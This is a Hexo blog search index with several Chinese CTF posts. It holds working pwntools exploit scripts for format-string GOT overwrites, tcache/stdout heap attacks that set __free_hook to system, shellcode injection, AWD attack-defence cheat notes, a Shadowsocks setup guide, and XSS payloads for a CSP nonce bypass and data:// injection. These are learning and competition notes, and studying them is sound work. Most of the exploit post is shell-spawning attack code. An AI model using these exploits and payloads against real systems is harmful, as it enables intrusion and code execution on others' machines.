<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[pwn-exp学习]]></title>
    <url>%2F2019%2F01%2F01%2Fpwn-exp%2F</url>
    <content type="text"><![CDATA[平时有很多pwn的exp编写脚本，通过看这些脚本，可以学习怎么快速编写exp，同时可以熟悉pwntools的使用。 格式化字符串漏洞n 检测脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8from pwn import *test_str = '88888888''''这个代码适用于linux64位格式化字符串漏洞。这个代码主要是为了找到输入点所在的栈区的下一个8字节区所对应的n。即 aaa%n$lx88888888中'88888888'对应的n值。运行之后 grep '#####'。当能用%p的时候用这个fmt = '%&#123;n&#125;$lp'.format(n = str(i)) p.recvuntil('0x',timeout=0.1)注：发送payload和接收payload的时机要根据实际情况调整。''''''实例的输出：root@HSH1000070537:~/pwn# ./fake-cgi Who r u?aaawelcome!aaa111111HTTP/1.1 404 Not FoundContent-Type: text/html; charset=UTF-8Content-Length: 23Server: EasyServer (Linux)'''def test_n(i): print('no.%d try!' %i) p = process('./fake-cgi') fmt = '%&#123;n&#125;$lp'.format(n = str(i)) # %p能用，否则换成 fmt = '%&#123;n&#125;$lx'.format(n = str(i)) payload = 'a'*(8-len(fmt)) +fmt + test_str p.sendlineafter('u?',payload) #根据情况调整 #根据情况调整中间的逻辑 p.recvuntil('0x',timeout=0.1) # %p ，否则换成 p.recvuntil('a'*(8-len(fmt)),timeout=0.1) get_str = p.recv(16) if get_str.endswith('383838383838'): success('##### the n = '+str(i)+', recv: '+get_str+" #####") #p.sendline('111') p.kill() return True #p.sendline('111') p.kill() return False #print(i,hex(addr))def get_n(r1 = 7,r2 = 15): for i in range(r1,r2+1): try: if test_n(i): return "[+]find it! n = %s" %i except Exception as e: return '[-]somethig error!' get_n() 格式化漏洞exp实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#coding:utf-8from pwn import *import sys,time#context.log_level = "debug"def get_flag(): p = process('./once_time') p.recvuntil('input your name: ') p.sendline('D') p.recvline() p.recvuntil('leave a msg: ') #到达buff的偏移是6，buff大小是24 stack_chk_fail_got = 0x601020 #0x00000000004006c6 vun_addr = 0x4008c5 read_got = 0x601040 fmt = '%2245c%8$hn' + '%9$s' + '\n' fmt += (16 - len(fmt))*'A' fmt += p64(stack_chk_fail_got) + p64(read_got) p.send(fmt) data = p.recvline() data = data[len(data)-7:-1] read_addr = u64(data + '\x00\x00') read_offset = 0xf7220 puts_got = 0x601018 system_offset = 0x45390 libcbase = read_addr - read_offset print 'libcbase = %x'%libcbase system_addr = libcbase + system_offset sh = libcbase + 0x18cd17 #0x00400a83: pop rdi ; ret pop_rdi = 0x00400a83 #0x00400a80: pop r14 ; pop r15 ; ret ppr = 0x00400a80 #second fmt #改写puts_got为ppr，由于puts_got并没有被dl_rev填充还是plt+6只需要修改后2字节为a80 fmt = '%' + str(0xa80) + 'c' fmt += '%8$hn' fmt += (16-len(fmt))*'A' fmt += p64(puts_got) fmt += (32-len(fmt))*'A' p.send(fmt) #third fmt fmt = '%'+'p'*7 fmt += p64(pop_rdi) fmt += p64(sh) fmt += p64(system_addr) p.send(fmt) p.clean() p.interactive()####### 重点学习 ########################def write(addr,value): offset_list = [0,16,32] for index,offset in enumerate([0,16,32]): wait_to_write = (value &gt;&gt; offset) &amp; 0xffff payload = ('%' + str(wait_to_write) + 'c%8$hn').ljust(16,' ') + p64(addr + index*2) + p64(0xaabbccdd) io.send(payload) time.sleep(0.2) io.clean()##### 重点学习 ####io = process("./once_time")elf = io.elflibc = elf.libc#### ##### ####################io.recvuntil("name: ")io.send("icsltest")io.recvuntil("msg: ")# raw_input()# io.send('AAAA%6$x') # AAAA41414141# print io.clean()vuln_fuc_addr = 0x4008c5call_setvbuf = 0x400856stack_chk_got = 0x601020 # objdump -dj.plt ./once_time | grep -A 5 stack_chksetvbuf_got = 0x601058stdin_addr = 0x601088# change the got value of *0x601020==0x4006c6 to vuln func addr 0x4008c5# so only last two byte 0x8c5==2245 to write# leak setvbuf addr and got libc basepayload = ("%2245c%8$hn" + "%9$s").ljust(16, " ") + p64(stack_chk_got) + p64(setvbuf_got)io.send(payload)data = io.recvuntil("msg: ")setvbuf_addr = u64(data.strip()[1:1+6].ljust(8,'\x00'))libc_base = setvbuf_addr - libc.sym['setvbuf'] # objdump -T /lib/x86_64-linux-gnu/libc-2.23.so | grep setvbufsystem_addr = libc_base + libc.sym['system']binsh_addr = libc_base + list(libc.search("/bin/sh"))[0] # strings -a -t x /lib/x86_64-linux-gnu/libc-2.23.so | grep /bin/shlog.info('libc base : ' + hex(libc_base))log.info('system addr : ' + hex(system_addr))log.info('/bin/sh addr : ' + hex(binsh_addr))# change .bss stdin to /bin/sh addr# change got of setvbuf to system addrwrite(stdin_addr,binsh_addr)write(setvbuf_got,system_addr)# change the got value of *0x601020==0x4006c6 to vuln func addr 0x400856# so only last two byte 0x856==2134 to writepayload = '%2134c%8$hn'.ljust(16, " ") + p64(stack_chk_got) + p64(0xaabbccdd)io.send(payload)io.clean()log.info('getshell...')io.interactive() 好的exp格式，方便调试12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'split', '-h']context.arch = 'i386'context.endian = 'little'p = process('./notebook')p = process('', env=&#123;'LD_PRELOAD': ''&#125;)gdb.attach(p)s = lambda a: p.send(str(a))sa = lambda a, b: p.sendafter(str(a), str(b))st = lambda a, b: p.sendthen(str(a), str(b))sl = lambda a: p.sendline(str(a))sla = lambda a, b: p.sendlineafter(str(a), str(b))slt = lambda a, b: p.sendlinethen(str(a), str(b))r = lambda a=4096: p.recv(a)rl = lambda: p.recvline()ru = lambda a: p.recvuntil(str(a))irt = lambda: p.interactive()def choice(idx): def wrap(f): def go(*args,**kargs): sla("&gt; ", idx) f(*args,**kargs) return go return wrap@choice(1)def show(): pass@choice(2)def add(length, data): sla('of URL: ', length) sla('URL: ', data)@choice(5)def export(email): sla('Your Email:', email)email_bss = 0x804BC80export(asm(shellcraft.linux.sh()))add(400, 'http://%\x00' + cyclic(277) + p32(email_bss))show()irt()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>exp</tag>
        <tag>model</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字符串格式化漏洞利用技巧]]></title>
    <url>%2F2019%2F01%2F01%2Fformat-vul%2F</url>
    <content type="text"><![CDATA[在某个函数被调用之前，由于linux动态链接的时候采用的是延时绑定的机制因此某个函数在被实际调用之前，它的got表存储的内容实际是plt的下一条指令，因而可以用gdb调试查看它的值。而字符串格式化漏洞就可以改变这个值，让函数跑到自己控制的跳转。 备注：hn可以修改双字节的内容,hhn修改单字节的内容 并且高地址对应的是高字节，即我们要修改got[‘printf’]的时候，需要把printf+21234567891011121314got['printf'] = 0x6012B8修改成 0x60268B的时候，只需要让got['printf'] = 0x268Bgot['printf'] = 0x60def write(addr,value): offset_list = [0,16,32] for index,offset in enumerate([0,16,32]): wait_to_write = (value &gt;&gt; offset) &amp; 0xffff payload = ('%' + str(wait_to_write) + 'c%8$hn').ljust(16,' ') + p64(addr + index*2) + p64(0xaabbccdd) io.send(payload) time.sleep(0.2) io.clean() https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/https://potatso.xyz/2018/04/07/pwn%E4%B9%8Bret2_dl_resolve/https://vang3lis.github.io/2018/09/30/ret2_dl_runtime_resolve/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>format</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[awd-cheat]]></title>
    <url>%2F2018%2F12%2F23%2Fawd-cheat%2F</url>
    <content type="text"><![CDATA[awd skills 文件共享 Samba/Win文件共享 /FTP 飞鸽传书 HackMD 免密登录 vim ~/.ssh/config ssh-keygen -t rsa 熟练使用 byotu/tmux/screen patch cp pwn_patched /path/to/version/pwn_0911_what_are_changes //做好版本管理 scp pwn_0911_what_are_changes ctf-pwn:/tmp/pwn_patch_newest ctf@ctf-pwn$ rm /home/pwn/pwn ;cp /tmp/pwn_patch_newest /home/pwn/pwn chmod +x /home/pwn/pwn Web:直接修改 restore tar zxvf privilege webshell cp pwn pwn.bak;cp /bin/sh pwn;(echo yyy|nc ) uname -a -&gt;4.4.0-ubuntu-136 -&gt;db-exploit.org -&gt;… mysql with root&gt;grant select,update,delete on da…. monitor ps -ef |grep apache2 |wc -l while true;do ps -u pwn ;sleep(1);done ps -o pid (执行多次对比pid值增加速度，对于某些反复启动的马) inotify /var/www/html /tmp clean backdoor killall -u pwn /killall -u www-date kill -9 -1 crontab -r chmod 777 /path/to/backdoor.php ; rm /path/to/backdoor.php (当你没有直接权限删除的时候，先修改它的权限) 确认被提权了，申请重置 automata multiprocessing paramiko /from pwn import ssh flask(submit api) easy_patch思想：简单修改程序的逻辑或者参数，让exp失效plt.free -&gt; ret sub esp,20hmov ecx, [esp +10]改成sub esp,30hmov ecx, [esp +10] get flow tcpdump -i 网卡 -s 0 -w 1.pcap 流量转发 ptrace]]></content>
      <tags>
        <tag>awd</tag>
        <tag>cheat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn-testing]]></title>
    <url>%2F2018%2F12%2F23%2FpwnTesting%2F</url>
    <content type="text"><![CDATA[pwn skills https://changochen.github.io/2018-11-26-bctf-2018.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *local=1pc='./three'remote_addr=['',0]aslr=Falsecontext.log_level=Truelibc=ELF('./libc.so.6')if local==1: p = process(pc,aslr=aslr) gdb.attach(p,'c')else: p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)def lg(s,addr): print('\033[1;31;40m%20s--&gt;0x%x\033[0m'%(s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))def choice(idx): sla("choice:",str(idx))def add(content): choice(1) sa("content:",content)def edit(idx,content): choice(2) sla("idx:",str(idx)) sa("content:",content)def free(idx,c): choice(3) sla(":",str(idx)) sla(":",c)if __name__ == '__main__': add("123") add(p64(0x11)*8) free(1,'y') free(0,'n') edit(0,p8(0x50)) add('123') add(p64(0)) free(1,'n') edit(2,p64(0)+p64(0x91)) for i in range(0x7): free(1,'n') edit(2,p64(0)+p64(0x51)) free(0,'y') edit(2,p64(0)+p64(0x91)) free(1,'y') # Bruteforce 4 bits to make fd point to _IO_2_1_stdout_ edit(2,p64(0)+p64(0x51)+p16(0x7760)) add("123") # Modify the flag and the write pointers add(p64(0xfbad3c80)+p64(0)*3+p8(0)) rv(8) libc_addr=raddr()-0x3ed8b0 lg("libc",libc_addr) libc.address=libc_addr ru("Done") free(0,'y') edit(2,p64(0)+p64(0x51)+p64(libc.symbols['__free_hook'])) add("123") edit(2,p64(0)+p64(0x61)+p64(libc.symbols['__free_hook'])) free(0,'y') add(p64(libc.symbols['system'])) edit(2,'/bin/sh\x00') choice(3) sla(":",str(2)) p.interactive() gdb.attach() 让脚本进入交互模式import codecode.interact(local = locals())#IPython交互from IPython import embed() 思路主要是简单修改payload : add()，之后运行脚本attach gdb之后查看执行情况实例：待补充]]></content>
      <tags>
        <tag>cheat</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在linux下配置shadowsocks服务端&客户端]]></title>
    <url>%2F2018%2F12%2F09%2Fss%2F</url>
    <content type="text"><![CDATA[Shadowsocks可以指：一种基于Socks5代理方式的加密传输协议，也可以指实现这个协议的各种开发包。目前包使用Python、C、C++、C#、Go语言等编程语言开发，大部分主要实现（iOS平台的除外）采用Apache许可证、GPL、MIT许可证等多种自由软件许可协议开放源代码。Shadowsocks分为服务器端和客户端，在使用之前，需要先将服务器端部署到服务器上面，然后通过客户端连接并创建本地代理。在中国大陆，本工具也被广泛用于突破防火长城（GFW），以浏览被封锁、遮蔽或干扰的内容。2015年8月22日，Shadowsocks原作者Clowwindy称受到了中国政府的压力，宣布停止维护此计划（项目）并移除其个人页面所存储的源代码。shadowsocks的github 在linux[ubuntu,debin]下配置shadowsocks: 安装12sudo apt-get install python-pippip install shadowsocks 服务端配置开启服务ssserver -p 443 -k password -m aes-256-cfb 后台运行sudo ssserver -p 443 -k password -m rc4-md5 --user nobody -d start 停止sudo ssserver -d stop 检查日志sudo less /var/log/shadowsocks.log 使用json配置文件配置服务虽然这样子可以开启服务，但是在该终端关闭后，进程也会被kill因此，还是推荐通过配置文件/etc/shadowsocks.json启动123ssserver -c /etc/shadowsocks.json -d startssserver -c /etc/shadowsocks.json -d stopssserver -c /etc/shadowsocks.json -d restart 具体配置文件的格式请看下面，需要注意的是IP地址写的都应该是要作为服务器的IP,并且客户端和服务端的配置文件/etc/shadowsocks.json中的其他参数都要一致。 客户端配置创建配置文件/etc/shadowsocks.json Example:12345678910&#123; "server":"my_server_ip", "server_port":8388, "local_address": "127.0.0.1", "local_port":1080, "password":"mypassword", "timeout":300, "method":"aes-256-cfb", "fast_open": false&#125; 启动shadowsocks:sudo sslocal -c /etc/shadowsocks.json -d start 配置代理：参考：http://www.myhack58.com/Article/60/63/2017/82591.htm需要修改/etc/proxychains.conf文件，添加相对应的配置sock5的端口为1080，这里的端口是你之前设置的那个json文件里面的local_port，对应即可 还要把dynamic_chain前面的注释符去掉 接着输入proxyresolv www.google.com试试看，可能会报错，添加以下路径：cp /usr/lib/proxychains3/proxyresolv /usr/bin/ 最后在需要使用代理的终端命令或者浏览器前面加上proxychains即可，比如1proxychains firefox 在最新版的kali安装ss可能会遇到报错的问题，解决方案参考【使用gedit打开】Kali2.0 update到最新版本后安装shadowsocks服务报错问题]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>vpn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS--CSP绕过【firefox和chrome】和data://协议的使用]]></title>
    <url>%2F2018%2F12%2F08%2Fxss-1%2F</url>
    <content type="text"><![CDATA[最近做一道关于XSS的CTF题目，用到了data://协议触发XSS，并且需要绕过带nonce的CSP策略。由于题目环境没有了，这里主要总结一下其中用到的一些技巧。 CSP绕过在绕过csp策略的时候，找到了以下这篇文章https://www.jianshu.com/p/f1de775bc43e 由于使用了CSP策略，一般想要获取cookie的方法，主要是使用以下几种跳转语句。 对于带有nonce的CSP策略，要执行跳转语句可以使用这种方式绕过，但是由于Chrome和Firefox对于标签的补齐和解析使用了不一样的方式，因此这个绕过的payload有些不一样。 在firefox上可以直接使用上述的payload，只要把跳转语句写入 src 指向的文件//14.rs就可以了，因为属性 a 后面的 &quot; 会被优先解析，这样就会把里面的&lt;/p&gt; &lt;script id=解析成字符串，从而成功引入了带有nonce的script，从而成功执行src里的内容。 Chrome对于标签的解析方式则不同，虽然它也是这样补齐了标签，但是解析的时候仍然会优先解析&quot;里的script，导致发生错误，无法实现xss。在这种情况下，只需要使用Chrome解析html5 的属性的一种特性——浏览器只会解析同一个标签内的第一个属性，对于后面的同名属性，会自动忽略掉。因此，只要改一下payload： 12345&lt;script src=//14.rs a="test" a=" //这样会把后面 a="&lt;/p&gt;&lt;script id="给直接忽略掉或者&lt;script src=//14.rs src="//把src后面的内容直接忽略 由此可以成功引入带有nonce的&lt;script&gt;标签，成功执行XSS。 data://协议使用在XSS的时候，可能常常会用到php伪协议的辅助，比如这样两种情况： 对于提交的内容，通过htmlspecialchars()函数来转义特殊字符，然后保存到某个文件里，之后通过文件包含，把文件的内容输出到某个html标签之间。 对于提交的内容，通过htmlspecialchars()函数来转义特殊字符，然后把内容在某个HTML标签内输出出来。 在这种情况下，怎么去触发XSS呢？这个时候，可以考虑使用data://这个协议：只要把红框中的内容修改成&lt;script&gt;alert(1)&lt;script&gt;的base64编码JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==就可以触发xss了。 实例使用php实现一个简单的笔记上传保存到文件里，并显示到网页的功能：getnote.php:1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;dataXSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="upnote.php" method="post"&gt; &lt;p&gt;note:&lt;/p&gt; &lt;input type="text" name="note" &gt; &lt;input type="submit" name="submit"&gt;&lt;/form&gt;&lt;?php$url = $_GET['url'];echo "&lt;p&gt;your input url:&lt;/p&gt;"."&lt;p&gt;".urldecode(file_get_contents($url)) ."&lt;/p&gt;";?&gt;&lt;/body&gt;&lt;/html&gt; upnote.php1234&lt;?phpfile_put_contents('url.txt',htmlspecialchars($_POST[note]));header('location:getnote.php?url=url.txt');?&gt; 程序的逻辑很简单，不多介绍。首先我们访问：getnote.php，把笔记的内容写成&lt;script&gt;alert(1)&lt;/script&gt;，然后提交： 没有发生弹框，检查元素可以发现&lt;,&gt;都被htmlspecialchars()转义了，看一下文件内容发现也被转义了，如下图： 这个时候，我们发现读取url的函数使用的是file_get_contents($url)，因此可以使用data://协议，构造下面的payload:1getnote.php?url=data://text/plain;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ== 访问，发现弹框了。]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>CSP</tag>
        <tag>data://</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F12%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo，next</tag>
      </tags>
  </entry>
</search>
